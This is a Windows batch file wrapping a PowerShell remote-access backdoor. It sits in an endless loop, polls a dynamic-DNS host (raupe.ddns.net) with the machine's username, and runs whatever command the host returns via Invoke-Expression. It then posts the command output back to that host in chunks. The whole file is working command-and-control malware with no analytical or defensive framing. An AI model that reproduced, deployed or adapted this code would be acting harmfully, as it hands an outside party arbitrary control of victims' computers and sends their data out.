@echo off
setlocal EnableDelayedExpansion

:loop
powershell -NoProfile -Command ^
    "$url = 'raupe.ddns.net/cdr';" ^
    "$separator = ' ||| ';" ^
    "$username = $env:USERNAME;" ^
    "$lastCommand = '';" ^
    "$lastOutput = '';" ^
    "$ErrorActionPreference = 'Stop';" ^
    "while ($true) {" ^
    "    try {" ^
    "        Write-Host \"Sending POST request to $url\";" ^
    "        $body = \"$username$separator\" + 'GET';" ^
    "        $headers = @{'Content-Type' = 'application/x-www-form-urlencoded'};" ^
    "        $response = Invoke-WebRequest -Uri $url -Method Post -Body $body -Headers $headers -TimeoutSec 20;" ^
    "        $receivedContent = $response.Content.Trim();" ^
    "        Write-Host \"Received Content: $receivedContent\";" ^
    "        Write-Host \"Last Output: $lastOutput\";" ^
    "        $receivedParts = $receivedContent -split [regex]::Escape($separator);" ^
    "        if ($receivedParts.Length -ge 2) {" ^
    "            $action = $receivedParts[0].Trim();" ^
    "            $command = $receivedParts[1..($receivedParts.Length - 1)] -join $separator;" ^
    "            Write-Host \"Action: $action\";" ^
    "            Write-Host \"Command: $command\";" ^
    "        } else {" ^
    "            $action = ''; $command = '';" ^
    "            Write-Host 'Invalid received content structure.';" ^
    "        }" ^
    "    } catch {" ^
    "        Write-Host 'Error during POST request: $($_.Exception.Message)';" ^
    "        Start-Sleep -Seconds 10;" ^
    "        continue;" ^
    "    }" ^
    "    if ($action -ne 'execute') {" ^
    "        Write-Host 'Received non-execute action. Waiting...';" ^
    "        Start-Sleep -Seconds 10;" ^
    "    } elseif ([string]::IsNullOrWhiteSpace($command)) {" ^
    "        Write-Host 'No command received. Waiting...';" ^
    "        Start-Sleep -Seconds 10;" ^
    "    } elseif ([string]::Equals($command, $lastOutput)) {" ^
    "        Write-Host \"Received same output as last one: $command. Breaking and sleeping...\";" ^
    "        Start-Sleep -Seconds 30;" ^
    "        break;" ^
    "    } elseif ($command -eq $lastCommand) {" ^
    "        Write-Host 'Received same command as last one. Waiting...';" ^
    "        Start-Sleep -Seconds 10;" ^
    "    } else {" ^
    "        try {" ^
    "            Write-Host \"Executing: $command\";" ^
    "            try {" ^
    "                $output = Invoke-Expression $command 2>&1 | Out-String;" ^
    "                $output = $output.Trim();" ^
    "                Write-Host \"Output: $output\";" ^
    "                if ([string]::IsNullOrWhiteSpace($output)) {" ^
    "                    $output = \"'$command' executed\";" ^
    "                }" ^
    "            } catch {" ^
    "                $output = 'Error executing command: $($_.Exception.Message)';" ^
    "                Write-Host $output;" ^
    "            }" ^
    "        } catch {" ^
    "            $output = 'Unexpected error: $($_.Exception.Message)';" ^
    "            Write-Host $output;" ^
    "        }" ^
    "        $chunkSize = 8000;" ^
    "        $totalChunks = [math]::Ceiling($output.Length / $chunkSize);" ^
    "        for ($i = 0; $i -lt $totalChunks; $i++) {" ^
    "            $start = $i * $chunkSize;" ^
    "            $end = [math]::Min($start + $chunkSize, $output.Length);" ^
    "            $chunk = $output.Substring($start, $end - $start);" ^
    "            $finalOutput = \"$username$separator\" + '\"output\"' + \"$separator$chunk\";" ^
    "            $headers = @{'Content-Type' = 'text/plain'};" ^
    "            $postSuccess = $false;" ^
    "            $postAttempts = 0;" ^
    "            while (-not $postSuccess -and $postAttempts -lt 3) {" ^
    "                try {" ^
    "                    Invoke-WebRequest -Uri $url -Method Post -Body $finalOutput -Headers $headers -TimeoutSec 20;" ^
    "                    $postSuccess = $true;" ^
    "                } catch {" ^
    "                    Write-Host 'Error sending POST request: $($_.Exception.Message)';" ^
    "                    Start-Sleep -Seconds 5;" ^
    "                    $postAttempts++;" ^
    "                }" ^
    "            }" ^
    "            if (-not $postSuccess) { Write-Host 'Failed to send output chunk. Continuing...'; }" ^
    "        }" ^
    "        $lastCommand = $command;" ^
    "        $lastOutput = $output.Trim();" ^
    "    }" ^
    "}" ^
echo Looping again...
goto loop

endlocal
